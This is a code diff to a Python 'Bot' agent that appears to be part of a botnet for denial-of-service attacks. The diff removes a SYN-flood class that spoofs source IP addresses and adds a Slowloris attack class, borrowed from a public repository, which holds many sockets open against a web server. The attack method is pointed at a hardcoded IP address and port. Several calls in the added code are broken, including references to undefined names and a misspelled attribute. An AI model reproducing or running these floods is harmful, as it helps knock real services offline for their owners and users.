@@ -9,6 +9,9 @@ import struct
 from random import *
 import time
 
+#from progress.bar import Bar
+
+
 RECV_BUFFER = 4096
 ENCODING = 'utf-8'
 
@@ -121,7 +124,7 @@ class Bot():
 			attack.run()
 		
 	def attack2(self):
-		attack2 = SynFloodAttack(self.target_address)
+		attack2 = SlowLorisAttack('68.146.50.254', 9999) 
 		while self.attacking == True:
 			attack2.run()
 
@@ -195,113 +198,89 @@ class RequestAttack():
 		except Exception as e:
 			print(e)
 			sys.exit()
-			
-
-class SynFloodAttack():
-	def __init__(self, target: str):
-		self.target = target
-		self.psh = ''
-		
-	def checksum(self):
-		s = 0
-
-		# loop through 2 characters at a time
-		for i in range(0,len(self.psh),2):
-			w = ((self.psh[i]) << 8) + ((self.psh[i+1]))
-			s = s + w
-
-		s = (s>>16) + (s & 0xffff)
-
-		# compliment and mask to 4 byte short
-		s = ~s & 0xffff
-
-		return s
-
-	def fake_ip(self):
-		skip = '127'
-		rand = range(4)
-		for x in range(4):
-			rand[x] = randrange(0,256)
-		if rand[0] == skip:
-			fake_ip()
-		fkip = '%d.%d.%d.%d' % (rand[0],rand[1],rand[2],rand[3])
-		return fkip
-		
-	def Building_packet(self):
-		#ip header fields
-		ihl = 5
-		version = 4
-		tos = 0
-		tot = 40
-		id = 54321  #id of this packet
-		frag_off = 0
-		ttl = 64 #255
-		protocol = socket.IPPROTO_TCP  #socket
-		check = 10
-		src_addr = socket.inet_aton(self.fake_ip()) #"source" - spoofed - converted to binary
-		dst_addr = socket.inet_aton(self.target) #destination - converted to binary
-
-		ihl_version = (version << 4) + ihl
-		#the ! in the pack format string means network order
-		ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot, id, frag_off, ttl, protocol, check, src_addr, dst_addr)
-
-		#tcp header fields
-		source = 54321 #source port -- 1234
-		dest = 80      #destination port
-		seq = 0
-		ack_seq = 0
-		doff = 5       #4 bit field, size of tcp header, 5 * 4 = 20 bytes
-				#tcp flags
-		fin = 0
-		syn = 1
-		rst = 0
-		ack = 0
-		psh = 0
-		urg = 0
-		window = htons(5840)  #socket -- maximum allowed window size
-		check = 0
-		urg_prt = 0
-
-		offset_res = (doff << 4)
-		tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
-
-		# the ! in the pack format string means network order
-		tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags, window, check, urg_prt)
-
-		#pseudo header fields
-
-		placeholder = 0
-		tcp_length = len(tcp_header)
-
-		self.psh = pack('!4s4sBBH', src_addr, dst_addr, placeholder, protocol,tcp_length)
-		self.psh = self.psh + tcp_header
-
-		tcp_checksum = self.checksum()
-
-		# make the tcp header again and fill in the correct checksum
-		tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags, window, tcp_checksum, urg_prt)
-
-		#final full packet - syn packets do not have any data
-		packet = ip_header + tcp_header
-
-		return packet
-
-	def run(self):
-		self.sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP) 
-		self.sock1.connect((self.target, 8080))
-		#self.sock1.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)   #tell kernel not to put in headers since we are providing it
-		packet=self.Building_packet()		
-		try:
-			self.sock1.send(packet)
-		except socket.timeout:
-			self.sock1.close()
-		except KeyboardInterrupt:
-			sys.exit(print('Canceled by user'))
-		except Exception as e:
-			print(e)
-			sys.exit()
 	  
-''' end of referenced code '''
+''' End of referenced code '''
+
+
+''' Original code from: Author: 0xc0d Github: https://github.com/0xc0d/Slow-Loris/blob/master/SlowLoris.py '''
+#regular_headers = [ "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
+     #               "Accept-language: en-US,en,q=0.5"]
+class SlowLorisAttack():
+   # regular_headers = [ "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
+    #                "Accept-language: en-US,en,q=0.5"]
+
+    def __init__(self, target: str, port: int):
+        self.target = target
+        self.port = port
+        self.regualr_headers = [ "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
+                    "Accept-language: en-US,en,q=0.5"]
+
+
+    def init_socket(self):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(4)
+        sock.connect((self.target,self.port))
+        sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode('UTF-8'))
+
+        for header in regular_headers:
+            sock.send('{}\r\n'.format(header).encode('UTF-8'))
+
+        return sock
+
+    def run(self):
+        #if len(sys.argv)<5:
+         #   print(("Usage: {} example.com 80 100 10".format(sys.argv[0])))
+          #  return
+
+        #ip = sys.argv[1]
+        #port = sys.argv[2]
+        socket_count= 100   # can adjust
+        #bar = Bar('\033[1;32;40m Creating Sockets...', max=socket_count)
+        timer = 10          # can adjust
+        socket_list=[]
+
+        for _ in range(int(socket_count)):
+            try:
+                sock = init_socket(self)
+            except socket.error:
+                break
+            socket_list.append(sock)
+            #next(bar)
+
+        #bar.finish()
+
+        while True:
+                try:
+                        print(("\033[0;37;40m Sending Keep-Alive Headers to {}".format(len(socket_list))))
+
+                        for s in socket_list:
+                            try:
+                                s.send("X-a {}\r\n".format(random.randint(1,5000)).encode('UTF-8'))
+                            except socket.error:
+                                socket_list.remove(s)
+
+                        for _ in range(socket_count - len(socket_list)):
+                            print(("\033[1;34;40m {}Re-creating Socket...".format("\n")))
+                            try:
+                                s = init_socket(ip,port)
+                                if s:
+                                    socket_list.append(s)
+                            except socket.error:
+                                break
+
+                        time.sleep(timer)
+                except socket.timeout:
+                        socket.close()
+                except KeyboardInterrupt:
+                        sys.exit(print('Canceled by user'))
+                except Exception as e:
+                        print(e)
+                        sys.exit()
+                
+
+    #if __name__=="__main__":
+     #   main()
+    ''' End of referenced code'''
 
 if __name__ == "__main__":
 	parser = argparse.ArgumentParser(description = 'Bot Agent')
